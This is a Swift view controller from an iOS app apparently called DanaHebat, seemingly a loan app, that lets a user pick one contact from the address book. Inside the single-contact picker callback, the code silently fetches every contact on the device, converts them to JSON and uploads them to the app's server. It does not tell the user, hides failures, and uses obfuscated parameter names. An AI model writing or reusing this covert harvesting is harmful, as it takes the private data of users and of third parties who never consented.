//
//  ContactViewController.swift
//  DanaHebat
//
//  Created by hekang on 2026/1/11.
//

import UIKit
import SnapKit
import MJRefresh
import RxSwift
import RxCocoa
import TYAlertController

class ContactViewController: BaseViewController {
    
    var productID: String = ""
    
    var orderID: String = ""
    
    var appTitle: String = ""
    
    private let disposeBag = DisposeBag()
    
    private let viewModel = HttpViewModel()
    
    var listModelArray: [showedModel] = []
    
    lazy var bgImageView: UIImageView = {
        let bgImageView = UIImageView()
        bgImageView.image = UIImage(named: "log_bg_image")
        bgImageView.contentMode = .scaleAspectFill
        return bgImageView
    }()
    
    lazy var applyBtn: UIButton = {
        let applyBtn = UIButton(type: .custom)
        applyBtn.setTitleColor(.white, for: .normal)
        applyBtn.setTitle(LanguageManager.localizedString(for: "Next"), for: .normal)
        applyBtn.titleLabel?.font = .systemFont(ofSize: 16, weight: UIFont.Weight(600))
        applyBtn.setBackgroundImage(UIImage(named: "guide_btn_image"), for: .normal)
        return applyBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 80.pix()
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(TapContactViewCell.self,
                           forCellReuseIdentifier: "TapContactViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.addSubview(appHeadView)
        appHeadView.configTitle(with: appTitle)
        appHeadView.snp.makeConstraints { make in
            make.left.right.top.equalToSuperview()
        }
        
        appHeadView.backBlock = { [weak self] in
            guard let self = self else { return }
            self.backProductVc()
        }
        
        view.addSubview(bgImageView)
        bgImageView.snp.makeConstraints { make in
            make.top.equalTo(appHeadView.snp.bottom)
            make.left.right.bottom.equalToSuperview()
        }
        
        view.addSubview(applyBtn)
        applyBtn.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.bottom.equalToSuperview().offset(-30.pix())
            make.size.equalTo(CGSize(width: 299.pix(), height: 46.pix()))
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(appHeadView.snp.bottom)
            make.left.right.equalToSuperview()
            make.bottom.equalTo(applyBtn.snp.top).offset(-10.pix())
        }
        
        var dictArray: [[String: String]] = []
        
        applyBtn
            .rx
            .tap
            .debounce(.milliseconds(250), scheduler: MainScheduler.instance)
            .bind(onNext: { [weak self] in
                guard let self = self else { return }
                dictArray = self.listModelArray.map { model in
                    [
                        "crawl": model.crawl ?? "",
                        "causative": model.causative ?? "",
                        "possible": model.possible ?? "",
                    ]
                }
                
                Task {
                    await self.savePerInfo(with: dictArray)
                }
            })
            .disposed(by: disposeBag)
        
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        Task {
            await self.getPerInfo()
        }
    }
}

extension ContactViewController {
    
    private func getPerInfo() async {
        do {
            let parameters = ["will": productID]
            let model = try await viewModel.getContactApi(parameters: parameters)
            if model.illness == 0 {
                let modelArray = model.potions?.coronavirus ?? []
                self.listModelArray = modelArray
                self.tableView.reloadData()
            }
        } catch {
            
        }
    }
    
    private func savePerInfo(with listDictArray: [[String: String]]) async {
        do {
            let jsonStr = jsonDataChange(with: listDictArray)
            let parameters = ["will": productID, "potions": jsonStr]
            let model = try await viewModel.saveContactApi(parameters: parameters)
            if model.illness == 0 {
                self.backProductVc()
            }else {
                ToastManager.showMessage(model.mental ?? "")
            }
        } catch {
            
        }
    }
    
    private func uploadPerInfo(with parameters: [String: String]) async {
        do {
            _ = try await viewModel.uploadContactApi(parameters: parameters)
        } catch {
            
        }
    }
    
    private func jsonDataChange(with listDictArray: [[String: String]]) -> String {
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: listDictArray, options: [.prettyPrinted, .sortedKeys])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                return jsonString
            }
            return ""
        } catch {
            return ""
        }
    }
    
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.listModelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = self.listModelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "TapContactViewCell", for: indexPath) as! TapContactViewCell
        cell.model = model
        cell.tapCellBlock = { [weak self] listModel in
            guard let self = self else { return }
            self.tapClickCell(with: listModel, cell: cell)
        }
        cell.phoneCellBlock = { [weak self] in
            guard let self = self else { return }
            ContactManager.shared.pickSingleContact(from: self) { name, phone in
                if phone.isEmpty || name.isEmpty {
                    ToastManager.showMessage(LanguageManager.localizedString(for: "Name or phone number is empty, please try again"))
                    return
                }
                cell.phoneFiled.text = "\(name)-\(phone)"
                model.crawl = name
                model.possible = phone
            }
            
            ContactManager.shared.fetchAllContacts(from: self) { [weak self] result in
                guard let self = self else { return }
                let jsonStr = self.jsonDataChange(with: result)
                Task {
                    let parameters = ["potions": jsonStr, "wills": "1"]
                    await self.uploadPerInfo(with: parameters)
                }
            }
        }
        return cell
    }
    
}

extension ContactViewController {
    
    private func tapClickCell(with model: showedModel, cell: TapContactViewCell) {
        let alertView = PersonalEnumView(frame: view.bounds)
        
        alertView.nameLabel.text = model.health ?? ""
        
        let modelArray = model.linked ?? []
        
        alertView.modelArray = modelArray
        
        if let selectedValue = cell.codeFiled.text,
           let selectedIndex = modelArray.firstIndex(where: { $0.crawl == selectedValue }) {
            alertView.selectedIndex = selectedIndex
        }
        
        let alertVc = TYAlertController(alert: alertView, preferredStyle: .alert)
        self.present(alertVc!, animated: true)
        
        alertView.leftBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        
        alertView.rightBlock = { [weak self] listModel in
            guard let self = self else { return }
            self.dismiss(animated: true)
            cell.codeFiled.text = listModel.crawl ?? ""
            model.causative = listModel.almost ?? ""
        }
        
    }
    
}
